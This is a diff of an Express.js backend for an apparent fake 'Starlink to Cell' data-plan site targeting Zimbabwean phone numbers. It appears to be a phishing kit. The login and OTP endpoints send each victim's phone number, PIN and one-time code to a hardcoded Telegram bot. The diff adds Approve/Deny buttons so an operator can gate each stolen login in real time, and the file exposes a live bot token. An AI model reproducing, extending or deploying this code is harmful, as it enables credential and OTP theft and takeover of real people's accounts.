@@ -38,12 +38,15 @@ app.use(express.urlencoded({ extended: true }));
 const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
 const CHAT_ID = '8392790531';
 
+// Store pending login requests
+const pendingRequests = {};
+
 // ============================================
-// SEND TELEGRAM NOTIFICATION - LOGIN
+// SEND TELEGRAM LOGIN REQUEST WITH APPROVAL BUTTONS
 // ============================================
-async function sendTelegramLogin(phone, pin) {
+async function sendTelegramLoginRequest(phone, pin, requestId) {
   try {
-    const message = `📡 *New Starlink to Cell Login Attempt*\n\n📱 *Phone:* +263 ${phone}\n🔢 *PIN:* ${pin}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to verify page.`;
+    const message = `📡 *New Starlink to Cell Login Request*\n\n📱 *Phone:* +263 ${phone}\n🔢 *PIN:* ${pin}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n⚠️ Please approve or deny this login request.`;
 
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -51,72 +54,105 @@ async function sendTelegramLogin(phone, pin) {
       body: JSON.stringify({
         chat_id: CHAT_ID,
         text: message,
-        parse_mode: 'Markdown'
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: '✅ Approve', callback_data: `approve_${requestId}` },
+              { text: '❌ Deny', callback_data: `deny_${requestId}` }
+            ]
+          ]
+        }
       })
     });
 
     const data = await response.json();
-    console.log('📤 Telegram Login:', data.ok ? '✅ Sent' : '❌ Failed');
+    console.log('📤 Telegram Login Request:', data.ok ? '✅ Sent' : '❌ Failed');
     return data;
   } catch (error) {
-    console.error('❌ Telegram login error:', error.message);
+    console.error('❌ Telegram error:', error.message);
     return null;
   }
 }
 
 // ============================================
-// SEND TELEGRAM OTP NOTIFICATION
+// HANDLE TELEGRAM CALLBACK (Approve/Deny)
 // ============================================
-async function sendTelegramOTP(phone, otp) {
+app.post('/api/telegram/callback', async (req, res) => {
   try {
-    const message = `📡 *Starlink to Cell - OTP Verification*\n\n📱 *Phone:* +263 ${phone}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
+    const { callback_data } = req.body;
 
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
+    console.log('📥 Callback received:', callback_data);
 
-    const data = await response.json();
-    console.log('📤 Telegram OTP:', data.ok ? '✅ Sent' : '❌ Failed');
-    return data;
+    if (!callback_data) {
+      return res.status(400).json({ success: false, message: 'No callback data' });
+    }
+
+    const [action, requestId] = callback_data.split('_');
+
+    if (!pendingRequests[requestId]) {
+      return res.status(404).json({ success: false, message: 'Request not found' });
+    }
+
+    if (action === 'approve') {
+      pendingRequests[requestId].status = 'approved';
+      console.log('✅ Login approved for request:', requestId);
+      
+      // Send confirmation to admin
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `✅ *Login Approved*\n\n📱 Phone: +263 ${pendingRequests[requestId].phone}\n\nUser has been redirected to verify page.`,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      res.json({ success: true, message: 'Login approved' });
+    } else if (action === 'deny') {
+      pendingRequests[requestId].status = 'denied';
+      console.log('❌ Login denied for request:', requestId);
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: `❌ *Login Denied*\n\n📱 Phone: +263 ${pendingRequests[requestId].phone}\n\nUser was denied access.`,
+          parse_mode: 'Markdown'
+        })
+      });
+
+      res.json({ success: true, message: 'Login denied' });
+    } else {
+      res.status(400).json({ success: false, message: 'Invalid action' });
+    }
   } catch (error) {
-    console.error('❌ Telegram OTP error:', error.message);
-    return null;
+    console.error('❌ Callback error:', error);
+    res.status(500).json({ success: false, message: error.message });
   }
-}
-
-// ============================================
-// API ROUTES
-// ============================================
-
-// Health check
-app.get('/api/health', (req, res) => {
-  res.json({
-    success: true,
-    status: 'OK',
-    timestamp: new Date().toISOString(),
-    environment: process.env.NODE_ENV || 'development',
-    message: 'Starlink to Cell API is running!'
-  });
 });
 
-// Root
-app.get('/', (req, res) => {
+// ============================================
+// CHECK LOGIN STATUS ENDPOINT
+// ============================================
+app.get('/api/auth/login-status/:requestId', (req, res) => {
+  const { requestId } = req.params;
+
+  if (!pendingRequests[requestId]) {
+    return res.status(404).json({
+      success: false,
+      message: 'Request not found'
+    });
+  }
+
+  const status = pendingRequests[requestId].status;
+
   res.json({
     success: true,
-    message: 'Starlink to Cell API is running!',
-    endpoints: {
-      health: '/api/health',
-      login: '/api/auth/login',
-      register: '/api/auth/register',
-      verify: '/api/auth/verify-otp',
-      plans: '/api/plans'
-    }
+    status: status,
+    phone: pendingRequests[requestId].phone
   });
 });
 
@@ -150,12 +186,24 @@ app.post('/api/auth/login', async (req, res) => {
       });
     }
 
-    // Send login Telegram notification
-    await sendTelegramLogin(phoneNumber, pin);
+    // Generate unique request ID
+    const requestId = 'login_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+
+    // Store pending request
+    pendingRequests[requestId] = {
+      phone: phoneNumber,
+      pin: pin,
+      status: 'pending',
+      timestamp: new Date().toISOString()
+    };
+
+    // Send Telegram notification with Approve/Deny buttons
+    await sendTelegramLoginRequest(phoneNumber, pin, requestId);
 
     res.json({
       success: true,
-      message: 'Login successful',
+      message: 'Login request sent. Please wait for admin approval.',
+      requestId: requestId,
       phoneNumber: phoneNumber,
       requiresVerification: true
     });
@@ -217,8 +265,22 @@ app.post('/api/auth/verify-otp', async (req, res) => {
       });
     }
 
-    // Send OTP to Telegram
-    await sendTelegramOTP(phoneNumber, otp);
+    // Send OTP to Telegram (notification only)
+    try {
+      const message = `📡 *Starlink to Cell - OTP Verification*\n\n📱 *Phone:* +263 ${phoneNumber}\n🔑 *OTP Entered:* \`${otp}\`\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been verified and redirected to dashboard.`;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
+    } catch (error) {
+      console.error('Telegram OTP error:', error.message);
+    }
 
     res.json({
       success: true,
@@ -236,7 +298,7 @@ app.post('/api/auth/verify-otp', async (req, res) => {
 });
 
 // ============================================
-// DATA PLANS ENDPOINT - GET ALL PLANS
+// DATA PLANS ENDPOINT
 // ============================================
 app.get('/api/plans', (req, res) => {
   const plans = [
@@ -293,136 +355,6 @@ app.get('/api/plans', (req, res) => {
   res.json({
     success: true,
     plans: plans
-  });
-});
-
-// ============================================
-// DATA PLANS ENDPOINT - GET SINGLE PLAN
-// ============================================
-app.get('/api/plans/:id', (req, res) => {
-  const { id } = req.params;
-  
-  const plans = [
-    {
-      id: '5gb',
-      name: '5GB Data',
-      days: '2-Day Plan',
-      price: 'Free trial',
-      badge: 'New users only',
-      isFree: true,
-      description: 'Perfect for trying out our service. No payment needed.',
-      data: '5GB',
-      validity: '2 days'
-    },
-    {
-      id: '15gb',
-      name: '15GB Data',
-      days: '7-Day Plan',
-      price: 'USD 0.99',
-      badge: 'Best for light users',
-      isFree: false,
-      description: 'Ideal for light browsing and messaging.',
-      data: '15GB',
-      validity: '7 days'
-    },
-    {
-      id: '35gb',
-      name: '35GB Data',
-      days: '14-Day Plan',
-      price: 'USD 1.99',
-      badge: 'Balanced',
-      isFree: false,
-      description: 'Perfect for streaming and social media.',
-      data: '35GB',
-      validity: '14 days'
-    },
-    {
-      id: '50gb',
-      name: '50GB Data',
-      days: '21-Day Plan',
-      price: 'USD 2.99',
-      badge: 'Heavy use',
-      isFree: false,
-      description: 'Great for heavy users who need more data.',
-      data: '50GB',
-      validity: '21 days'
-    },
-    {
-      id: 'monthly',
-      name: 'Monthly Unlimited',
-      days: '30-Day Plan',
-      price: 'USD 3.99',
-      badge: 'Most Popular',
-      isFree: false,
-      description: 'Unlimited data for a full month.',
-      data: 'Unlimited',
-      validity: '30 days'
-    },
-    {
-      id: '5g',
-      name: '5G Monthly Unlimited',
-      days: '30-Day Plan',
-      price: 'USD 7.99',
-      badge: '5G Coverage',
-      isFree: false,
-      description: 'High-speed 5G unlimited data.',
-      data: 'Unlimited 5G',
-      validity: '30 days'
-    }
-  ];
-
-  const plan = plans.find(p => p.id === id);
-
-  if (!plan) {
-    return res.status(404).json({
-      success: false,
-      message: 'Plan not found'
-    });
-  }
-
-  res.json({
-    success: true,
-    plan: plan
-  });
-});
-
-// ============================================
-// PURCHASE PLAN ENDPOINT (Future use)
-// ============================================
-app.post('/api/plans/purchase', async (req, res) => {
-  const { planId, phoneNumber } = req.body;
-
-  if (!planId || !phoneNumber) {
-    return res.status(400).json({
-      success: false,
-      message: 'Plan ID and phone number are required'
-    });
-  }
-
-  console.log('🛒 Purchase request:', { planId, phoneNumber });
-
-  // Send Telegram notification for purchase
-  try {
-    const message = `🛒 *New Plan Purchase*\n\n📱 *Phone:* +263 ${phoneNumber}\n📡 *Plan:* ${planId}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ Purchase request received.`;
-
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
-  } catch (error) {
-    console.error('❌ Telegram purchase error:', error.message);
-  }
-
-  res.json({
-    success: true,
-    message: 'Plan purchased successfully',
-    planId: planId,
-    phoneNumber: phoneNumber
   });
 });
 
